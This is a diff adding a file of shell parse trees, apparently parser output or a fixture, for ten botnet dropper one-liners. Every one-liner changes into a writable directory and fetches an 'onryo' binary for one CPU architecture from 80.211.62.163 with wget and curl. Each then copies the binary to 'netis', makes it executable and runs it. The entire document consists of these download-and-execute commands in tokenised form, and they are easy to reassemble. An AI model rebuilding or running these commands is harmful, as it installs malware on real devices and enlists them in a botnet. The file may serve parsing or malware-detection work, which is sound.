@@ -1,0 +1,550 @@
+ListNode(lineno=2, pos=(12, 201), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 107), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 107), word='http://80.211.62.163/bins/onryo.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(107, 108)),
+  CommandNode(lineno=2, pos=(109, 152), parts=[
+    WordNode(lineno=2, pos=(109, 113), word='curl'),
+    WordNode(lineno=2, pos=(114, 116), word='-O'),
+    WordNode(lineno=2, pos=(117, 152), word='http://80.211.62.163/bins/onryo.x86'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(152, 153)),
+  CommandNode(lineno=2, pos=(153, 173), parts=[
+    WordNode(lineno=2, pos=(153, 156), word='cat'),
+    WordNode(lineno=2, pos=(157, 166), word='onryo.x86'),
+    RedirectNode(lineno=2, output=
+      WordNode(lineno=2, pos=(168, 173), word='netis'), pos=(167, 173), type='>'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(173, 174)),
+  CommandNode(lineno=2, pos=(174, 184), parts=[
+    WordNode(lineno=2, pos=(174, 179), word='chmod'),
+    WordNode(lineno=2, pos=(180, 182), word='+x'),
+    WordNode(lineno=2, pos=(183, 184), word='*'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(184, 185)),
+  CommandNode(lineno=2, pos=(185, 201), parts=[
+    WordNode(lineno=2, pos=(185, 192), word='./netis'),
+    WordNode(lineno=2, pos=(193, 201), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=3, pos=(202, 394), parts=[
+  CommandNode(lineno=3, pos=(202, 209), parts=[
+    WordNode(lineno=3, pos=(202, 204), word='cd'),
+    WordNode(lineno=3, pos=(205, 209), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(210, 212)),
+  CommandNode(lineno=3, pos=(213, 224), parts=[
+    WordNode(lineno=3, pos=(213, 215), word='cd'),
+    WordNode(lineno=3, pos=(216, 224), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(225, 227)),
+  CommandNode(lineno=3, pos=(228, 235), parts=[
+    WordNode(lineno=3, pos=(228, 230), word='cd'),
+    WordNode(lineno=3, pos=(231, 235), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(236, 238)),
+  CommandNode(lineno=3, pos=(239, 247), parts=[
+    WordNode(lineno=3, pos=(239, 241), word='cd'),
+    WordNode(lineno=3, pos=(242, 247), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(248, 250)),
+  CommandNode(lineno=3, pos=(251, 255), parts=[
+    WordNode(lineno=3, pos=(251, 253), word='cd'),
+    WordNode(lineno=3, pos=(254, 255), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(255, 256)),
+  CommandNode(lineno=3, pos=(257, 298), parts=[
+    WordNode(lineno=3, pos=(257, 261), word='wget'),
+    WordNode(lineno=3, pos=(262, 298), word='http://80.211.62.163/bins/onryo.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(298, 299)),
+  CommandNode(lineno=3, pos=(300, 344), parts=[
+    WordNode(lineno=3, pos=(300, 304), word='curl'),
+    WordNode(lineno=3, pos=(305, 307), word='-O'),
+    WordNode(lineno=3, pos=(308, 344), word='http://80.211.62.163/bins/onryo.mips'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(344, 345)),
+  CommandNode(lineno=3, pos=(345, 366), parts=[
+    WordNode(lineno=3, pos=(345, 348), word='cat'),
+    WordNode(lineno=3, pos=(349, 359), word='onryo.mips'),
+    RedirectNode(lineno=3, output=
+      WordNode(lineno=3, pos=(361, 366), word='netis'), pos=(360, 366), type='>'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(366, 367)),
+  CommandNode(lineno=3, pos=(367, 377), parts=[
+    WordNode(lineno=3, pos=(367, 372), word='chmod'),
+    WordNode(lineno=3, pos=(373, 375), word='+x'),
+    WordNode(lineno=3, pos=(376, 377), word='*'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(377, 378)),
+  CommandNode(lineno=3, pos=(378, 394), parts=[
+    WordNode(lineno=3, pos=(378, 385), word='./netis'),
+    WordNode(lineno=3, pos=(386, 394), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=4, pos=(395, 587), parts=[
+  CommandNode(lineno=4, pos=(395, 402), parts=[
+    WordNode(lineno=4, pos=(395, 397), word='cd'),
+    WordNode(lineno=4, pos=(398, 402), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(403, 405)),
+  CommandNode(lineno=4, pos=(406, 417), parts=[
+    WordNode(lineno=4, pos=(406, 408), word='cd'),
+    WordNode(lineno=4, pos=(409, 417), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(418, 420)),
+  CommandNode(lineno=4, pos=(421, 428), parts=[
+    WordNode(lineno=4, pos=(421, 423), word='cd'),
+    WordNode(lineno=4, pos=(424, 428), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(429, 431)),
+  CommandNode(lineno=4, pos=(432, 440), parts=[
+    WordNode(lineno=4, pos=(432, 434), word='cd'),
+    WordNode(lineno=4, pos=(435, 440), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(441, 443)),
+  CommandNode(lineno=4, pos=(444, 448), parts=[
+    WordNode(lineno=4, pos=(444, 446), word='cd'),
+    WordNode(lineno=4, pos=(447, 448), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(448, 449)),
+  CommandNode(lineno=4, pos=(450, 491), parts=[
+    WordNode(lineno=4, pos=(450, 454), word='wget'),
+    WordNode(lineno=4, pos=(455, 491), word='http://80.211.62.163/bins/onryo.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(491, 492)),
+  CommandNode(lineno=4, pos=(493, 537), parts=[
+    WordNode(lineno=4, pos=(493, 497), word='curl'),
+    WordNode(lineno=4, pos=(498, 500), word='-O'),
+    WordNode(lineno=4, pos=(501, 537), word='http://80.211.62.163/bins/onryo.mpsl'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(537, 538)),
+  CommandNode(lineno=4, pos=(538, 559), parts=[
+    WordNode(lineno=4, pos=(538, 541), word='cat'),
+    WordNode(lineno=4, pos=(542, 552), word='onryo.mpsl'),
+    RedirectNode(lineno=4, output=
+      WordNode(lineno=4, pos=(554, 559), word='netis'), pos=(553, 559), type='>'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(559, 560)),
+  CommandNode(lineno=4, pos=(560, 570), parts=[
+    WordNode(lineno=4, pos=(560, 565), word='chmod'),
+    WordNode(lineno=4, pos=(566, 568), word='+x'),
+    WordNode(lineno=4, pos=(569, 570), word='*'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(570, 571)),
+  CommandNode(lineno=4, pos=(571, 587), parts=[
+    WordNode(lineno=4, pos=(571, 578), word='./netis'),
+    WordNode(lineno=4, pos=(579, 587), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=5, pos=(588, 780), parts=[
+  CommandNode(lineno=5, pos=(588, 595), parts=[
+    WordNode(lineno=5, pos=(588, 590), word='cd'),
+    WordNode(lineno=5, pos=(591, 595), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(596, 598)),
+  CommandNode(lineno=5, pos=(599, 610), parts=[
+    WordNode(lineno=5, pos=(599, 601), word='cd'),
+    WordNode(lineno=5, pos=(602, 610), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(611, 613)),
+  CommandNode(lineno=5, pos=(614, 621), parts=[
+    WordNode(lineno=5, pos=(614, 616), word='cd'),
+    WordNode(lineno=5, pos=(617, 621), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(622, 624)),
+  CommandNode(lineno=5, pos=(625, 633), parts=[
+    WordNode(lineno=5, pos=(625, 627), word='cd'),
+    WordNode(lineno=5, pos=(628, 633), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(634, 636)),
+  CommandNode(lineno=5, pos=(637, 641), parts=[
+    WordNode(lineno=5, pos=(637, 639), word='cd'),
+    WordNode(lineno=5, pos=(640, 641), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(641, 642)),
+  CommandNode(lineno=5, pos=(643, 684), parts=[
+    WordNode(lineno=5, pos=(643, 647), word='wget'),
+    WordNode(lineno=5, pos=(648, 684), word='http://80.211.62.163/bins/onryo.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(684, 685)),
+  CommandNode(lineno=5, pos=(686, 730), parts=[
+    WordNode(lineno=5, pos=(686, 690), word='curl'),
+    WordNode(lineno=5, pos=(691, 693), word='-O'),
+    WordNode(lineno=5, pos=(694, 730), word='http://80.211.62.163/bins/onryo.arm4'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(730, 731)),
+  CommandNode(lineno=5, pos=(731, 752), parts=[
+    WordNode(lineno=5, pos=(731, 734), word='cat'),
+    WordNode(lineno=5, pos=(735, 745), word='onryo.arm4'),
+    RedirectNode(lineno=5, output=
+      WordNode(lineno=5, pos=(747, 752), word='netis'), pos=(746, 752), type='>'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(752, 753)),
+  CommandNode(lineno=5, pos=(753, 763), parts=[
+    WordNode(lineno=5, pos=(753, 758), word='chmod'),
+    WordNode(lineno=5, pos=(759, 761), word='+x'),
+    WordNode(lineno=5, pos=(762, 763), word='*'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(763, 764)),
+  CommandNode(lineno=5, pos=(764, 780), parts=[
+    WordNode(lineno=5, pos=(764, 771), word='./netis'),
+    WordNode(lineno=5, pos=(772, 780), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=6, pos=(781, 973), parts=[
+  CommandNode(lineno=6, pos=(781, 788), parts=[
+    WordNode(lineno=6, pos=(781, 783), word='cd'),
+    WordNode(lineno=6, pos=(784, 788), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(789, 791)),
+  CommandNode(lineno=6, pos=(792, 803), parts=[
+    WordNode(lineno=6, pos=(792, 794), word='cd'),
+    WordNode(lineno=6, pos=(795, 803), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(804, 806)),
+  CommandNode(lineno=6, pos=(807, 814), parts=[
+    WordNode(lineno=6, pos=(807, 809), word='cd'),
+    WordNode(lineno=6, pos=(810, 814), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(815, 817)),
+  CommandNode(lineno=6, pos=(818, 826), parts=[
+    WordNode(lineno=6, pos=(818, 820), word='cd'),
+    WordNode(lineno=6, pos=(821, 826), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(827, 829)),
+  CommandNode(lineno=6, pos=(830, 834), parts=[
+    WordNode(lineno=6, pos=(830, 832), word='cd'),
+    WordNode(lineno=6, pos=(833, 834), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(834, 835)),
+  CommandNode(lineno=6, pos=(836, 877), parts=[
+    WordNode(lineno=6, pos=(836, 840), word='wget'),
+    WordNode(lineno=6, pos=(841, 877), word='http://80.211.62.163/bins/onryo.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(877, 878)),
+  CommandNode(lineno=6, pos=(879, 923), parts=[
+    WordNode(lineno=6, pos=(879, 883), word='curl'),
+    WordNode(lineno=6, pos=(884, 886), word='-O'),
+    WordNode(lineno=6, pos=(887, 923), word='http://80.211.62.163/bins/onryo.arm5'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(923, 924)),
+  CommandNode(lineno=6, pos=(924, 945), parts=[
+    WordNode(lineno=6, pos=(924, 927), word='cat'),
+    WordNode(lineno=6, pos=(928, 938), word='onryo.arm5'),
+    RedirectNode(lineno=6, output=
+      WordNode(lineno=6, pos=(940, 945), word='netis'), pos=(939, 945), type='>'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(945, 946)),
+  CommandNode(lineno=6, pos=(946, 956), parts=[
+    WordNode(lineno=6, pos=(946, 951), word='chmod'),
+    WordNode(lineno=6, pos=(952, 954), word='+x'),
+    WordNode(lineno=6, pos=(955, 956), word='*'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(956, 957)),
+  CommandNode(lineno=6, pos=(957, 973), parts=[
+    WordNode(lineno=6, pos=(957, 964), word='./netis'),
+    WordNode(lineno=6, pos=(965, 973), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=7, pos=(974, 1166), parts=[
+  CommandNode(lineno=7, pos=(974, 981), parts=[
+    WordNode(lineno=7, pos=(974, 976), word='cd'),
+    WordNode(lineno=7, pos=(977, 981), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(982, 984)),
+  CommandNode(lineno=7, pos=(985, 996), parts=[
+    WordNode(lineno=7, pos=(985, 987), word='cd'),
+    WordNode(lineno=7, pos=(988, 996), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(997, 999)),
+  CommandNode(lineno=7, pos=(1000, 1007), parts=[
+    WordNode(lineno=7, pos=(1000, 1002), word='cd'),
+    WordNode(lineno=7, pos=(1003, 1007), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1008, 1010)),
+  CommandNode(lineno=7, pos=(1011, 1019), parts=[
+    WordNode(lineno=7, pos=(1011, 1013), word='cd'),
+    WordNode(lineno=7, pos=(1014, 1019), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1020, 1022)),
+  CommandNode(lineno=7, pos=(1023, 1027), parts=[
+    WordNode(lineno=7, pos=(1023, 1025), word='cd'),
+    WordNode(lineno=7, pos=(1026, 1027), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1027, 1028)),
+  CommandNode(lineno=7, pos=(1029, 1070), parts=[
+    WordNode(lineno=7, pos=(1029, 1033), word='wget'),
+    WordNode(lineno=7, pos=(1034, 1070), word='http://80.211.62.163/bins/onryo.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1070, 1071)),
+  CommandNode(lineno=7, pos=(1072, 1116), parts=[
+    WordNode(lineno=7, pos=(1072, 1076), word='curl'),
+    WordNode(lineno=7, pos=(1077, 1079), word='-O'),
+    WordNode(lineno=7, pos=(1080, 1116), word='http://80.211.62.163/bins/onryo.arm6'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1116, 1117)),
+  CommandNode(lineno=7, pos=(1117, 1138), parts=[
+    WordNode(lineno=7, pos=(1117, 1120), word='cat'),
+    WordNode(lineno=7, pos=(1121, 1131), word='onryo.arm6'),
+    RedirectNode(lineno=7, output=
+      WordNode(lineno=7, pos=(1133, 1138), word='netis'), pos=(1132, 1138), type='>'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1138, 1139)),
+  CommandNode(lineno=7, pos=(1139, 1149), parts=[
+    WordNode(lineno=7, pos=(1139, 1144), word='chmod'),
+    WordNode(lineno=7, pos=(1145, 1147), word='+x'),
+    WordNode(lineno=7, pos=(1148, 1149), word='*'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1149, 1150)),
+  CommandNode(lineno=7, pos=(1150, 1166), parts=[
+    WordNode(lineno=7, pos=(1150, 1157), word='./netis'),
+    WordNode(lineno=7, pos=(1158, 1166), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=8, pos=(1167, 1359), parts=[
+  CommandNode(lineno=8, pos=(1167, 1174), parts=[
+    WordNode(lineno=8, pos=(1167, 1169), word='cd'),
+    WordNode(lineno=8, pos=(1170, 1174), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1175, 1177)),
+  CommandNode(lineno=8, pos=(1178, 1189), parts=[
+    WordNode(lineno=8, pos=(1178, 1180), word='cd'),
+    WordNode(lineno=8, pos=(1181, 1189), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1190, 1192)),
+  CommandNode(lineno=8, pos=(1193, 1200), parts=[
+    WordNode(lineno=8, pos=(1193, 1195), word='cd'),
+    WordNode(lineno=8, pos=(1196, 1200), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1201, 1203)),
+  CommandNode(lineno=8, pos=(1204, 1212), parts=[
+    WordNode(lineno=8, pos=(1204, 1206), word='cd'),
+    WordNode(lineno=8, pos=(1207, 1212), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1213, 1215)),
+  CommandNode(lineno=8, pos=(1216, 1220), parts=[
+    WordNode(lineno=8, pos=(1216, 1218), word='cd'),
+    WordNode(lineno=8, pos=(1219, 1220), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1220, 1221)),
+  CommandNode(lineno=8, pos=(1222, 1263), parts=[
+    WordNode(lineno=8, pos=(1222, 1226), word='wget'),
+    WordNode(lineno=8, pos=(1227, 1263), word='http://80.211.62.163/bins/onryo.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1263, 1264)),
+  CommandNode(lineno=8, pos=(1265, 1309), parts=[
+    WordNode(lineno=8, pos=(1265, 1269), word='curl'),
+    WordNode(lineno=8, pos=(1270, 1272), word='-O'),
+    WordNode(lineno=8, pos=(1273, 1309), word='http://80.211.62.163/bins/onryo.arm7'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1309, 1310)),
+  CommandNode(lineno=8, pos=(1310, 1331), parts=[
+    WordNode(lineno=8, pos=(1310, 1313), word='cat'),
+    WordNode(lineno=8, pos=(1314, 1324), word='onryo.arm7'),
+    RedirectNode(lineno=8, output=
+      WordNode(lineno=8, pos=(1326, 1331), word='netis'), pos=(1325, 1331), type='>'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1331, 1332)),
+  CommandNode(lineno=8, pos=(1332, 1342), parts=[
+    WordNode(lineno=8, pos=(1332, 1337), word='chmod'),
+    WordNode(lineno=8, pos=(1338, 1340), word='+x'),
+    WordNode(lineno=8, pos=(1341, 1342), word='*'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1342, 1343)),
+  CommandNode(lineno=8, pos=(1343, 1359), parts=[
+    WordNode(lineno=8, pos=(1343, 1350), word='./netis'),
+    WordNode(lineno=8, pos=(1351, 1359), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=9, pos=(1360, 1549), parts=[
+  CommandNode(lineno=9, pos=(1360, 1367), parts=[
+    WordNode(lineno=9, pos=(1360, 1362), word='cd'),
+    WordNode(lineno=9, pos=(1363, 1367), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1368, 1370)),
+  CommandNode(lineno=9, pos=(1371, 1382), parts=[
+    WordNode(lineno=9, pos=(1371, 1373), word='cd'),
+    WordNode(lineno=9, pos=(1374, 1382), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1383, 1385)),
+  CommandNode(lineno=9, pos=(1386, 1393), parts=[
+    WordNode(lineno=9, pos=(1386, 1388), word='cd'),
+    WordNode(lineno=9, pos=(1389, 1393), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1394, 1396)),
+  CommandNode(lineno=9, pos=(1397, 1405), parts=[
+    WordNode(lineno=9, pos=(1397, 1399), word='cd'),
+    WordNode(lineno=9, pos=(1400, 1405), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1406, 1408)),
+  CommandNode(lineno=9, pos=(1409, 1413), parts=[
+    WordNode(lineno=9, pos=(1409, 1411), word='cd'),
+    WordNode(lineno=9, pos=(1412, 1413), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1413, 1414)),
+  CommandNode(lineno=9, pos=(1415, 1455), parts=[
+    WordNode(lineno=9, pos=(1415, 1419), word='wget'),
+    WordNode(lineno=9, pos=(1420, 1455), word='http://80.211.62.163/bins/onryo.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1455, 1456)),
+  CommandNode(lineno=9, pos=(1457, 1500), parts=[
+    WordNode(lineno=9, pos=(1457, 1461), word='curl'),
+    WordNode(lineno=9, pos=(1462, 1464), word='-O'),
+    WordNode(lineno=9, pos=(1465, 1500), word='http://80.211.62.163/bins/onryo.ppc'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1500, 1501)),
+  CommandNode(lineno=9, pos=(1501, 1521), parts=[
+    WordNode(lineno=9, pos=(1501, 1504), word='cat'),
+    WordNode(lineno=9, pos=(1505, 1514), word='onryo.ppc'),
+    RedirectNode(lineno=9, output=
+      WordNode(lineno=9, pos=(1516, 1521), word='netis'), pos=(1515, 1521), type='>'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1521, 1522)),
+  CommandNode(lineno=9, pos=(1522, 1532), parts=[
+    WordNode(lineno=9, pos=(1522, 1527), word='chmod'),
+    WordNode(lineno=9, pos=(1528, 1530), word='+x'),
+    WordNode(lineno=9, pos=(1531, 1532), word='*'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1532, 1533)),
+  CommandNode(lineno=9, pos=(1533, 1549), parts=[
+    WordNode(lineno=9, pos=(1533, 1540), word='./netis'),
+    WordNode(lineno=9, pos=(1541, 1549), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=10, pos=(1550, 1742), parts=[
+  CommandNode(lineno=10, pos=(1550, 1557), parts=[
+    WordNode(lineno=10, pos=(1550, 1552), word='cd'),
+    WordNode(lineno=10, pos=(1553, 1557), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1558, 1560)),
+  CommandNode(lineno=10, pos=(1561, 1572), parts=[
+    WordNode(lineno=10, pos=(1561, 1563), word='cd'),
+    WordNode(lineno=10, pos=(1564, 1572), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1573, 1575)),
+  CommandNode(lineno=10, pos=(1576, 1583), parts=[
+    WordNode(lineno=10, pos=(1576, 1578), word='cd'),
+    WordNode(lineno=10, pos=(1579, 1583), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1584, 1586)),
+  CommandNode(lineno=10, pos=(1587, 1595), parts=[
+    WordNode(lineno=10, pos=(1587, 1589), word='cd'),
+    WordNode(lineno=10, pos=(1590, 1595), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1596, 1598)),
+  CommandNode(lineno=10, pos=(1599, 1603), parts=[
+    WordNode(lineno=10, pos=(1599, 1601), word='cd'),
+    WordNode(lineno=10, pos=(1602, 1603), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1603, 1604)),
+  CommandNode(lineno=10, pos=(1605, 1646), parts=[
+    WordNode(lineno=10, pos=(1605, 1609), word='wget'),
+    WordNode(lineno=10, pos=(1610, 1646), word='http://80.211.62.163/bins/onryo.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1646, 1647)),
+  CommandNode(lineno=10, pos=(1648, 1692), parts=[
+    WordNode(lineno=10, pos=(1648, 1652), word='curl'),
+    WordNode(lineno=10, pos=(1653, 1655), word='-O'),
+    WordNode(lineno=10, pos=(1656, 1692), word='http://80.211.62.163/bins/onryo.m68k'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1692, 1693)),
+  CommandNode(lineno=10, pos=(1693, 1714), parts=[
+    WordNode(lineno=10, pos=(1693, 1696), word='cat'),
+    WordNode(lineno=10, pos=(1697, 1707), word='onryo.m68k'),
+    RedirectNode(lineno=10, output=
+      WordNode(lineno=10, pos=(1709, 1714), word='netis'), pos=(1708, 1714), type='>'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1714, 1715)),
+  CommandNode(lineno=10, pos=(1715, 1725), parts=[
+    WordNode(lineno=10, pos=(1715, 1720), word='chmod'),
+    WordNode(lineno=10, pos=(1721, 1723), word='+x'),
+    WordNode(lineno=10, pos=(1724, 1725), word='*'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1725, 1726)),
+  CommandNode(lineno=10, pos=(1726, 1742), parts=[
+    WordNode(lineno=10, pos=(1726, 1733), word='./netis'),
+    WordNode(lineno=10, pos=(1734, 1742), word='ssh.wget'),
+  ]),
+])
+ListNode(lineno=11, pos=(1743, 1932), parts=[
+  CommandNode(lineno=11, pos=(1743, 1750), parts=[
+    WordNode(lineno=11, pos=(1743, 1745), word='cd'),
+    WordNode(lineno=11, pos=(1746, 1750), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1751, 1753)),
+  CommandNode(lineno=11, pos=(1754, 1765), parts=[
+    WordNode(lineno=11, pos=(1754, 1756), word='cd'),
+    WordNode(lineno=11, pos=(1757, 1765), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1766, 1768)),
+  CommandNode(lineno=11, pos=(1769, 1776), parts=[
+    WordNode(lineno=11, pos=(1769, 1771), word='cd'),
+    WordNode(lineno=11, pos=(1772, 1776), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1777, 1779)),
+  CommandNode(lineno=11, pos=(1780, 1788), parts=[
+    WordNode(lineno=11, pos=(1780, 1782), word='cd'),
+    WordNode(lineno=11, pos=(1783, 1788), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1789, 1791)),
+  CommandNode(lineno=11, pos=(1792, 1796), parts=[
+    WordNode(lineno=11, pos=(1792, 1794), word='cd'),
+    WordNode(lineno=11, pos=(1795, 1796), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1796, 1797)),
+  CommandNode(lineno=11, pos=(1798, 1838), parts=[
+    WordNode(lineno=11, pos=(1798, 1802), word='wget'),
+    WordNode(lineno=11, pos=(1803, 1838), word='http://80.211.62.163/bins/onryo.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1838, 1839)),
+  CommandNode(lineno=11, pos=(1840, 1883), parts=[
+    WordNode(lineno=11, pos=(1840, 1844), word='curl'),
+    WordNode(lineno=11, pos=(1845, 1847), word='-O'),
+    WordNode(lineno=11, pos=(1848, 1883), word='http://80.211.62.163/bins/onryo.sh4'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1883, 1884)),
+  CommandNode(lineno=11, pos=(1884, 1904), parts=[
+    WordNode(lineno=11, pos=(1884, 1887), word='cat'),
+    WordNode(lineno=11, pos=(1888, 1897), word='onryo.sh4'),
+    RedirectNode(lineno=11, output=
+      WordNode(lineno=11, pos=(1899, 1904), word='netis'), pos=(1898, 1904), type='>'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1904, 1905)),
+  CommandNode(lineno=11, pos=(1905, 1915), parts=[
+    WordNode(lineno=11, pos=(1905, 1910), word='chmod'),
+    WordNode(lineno=11, pos=(1911, 1913), word='+x'),
+    WordNode(lineno=11, pos=(1914, 1915), word='*'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1915, 1916)),
+  CommandNode(lineno=11, pos=(1916, 1932), parts=[
+    WordNode(lineno=11, pos=(1916, 1923), word='./netis'),
+    WordNode(lineno=11, pos=(1924, 1932), word='ssh.wget'),
+  ]),
+])
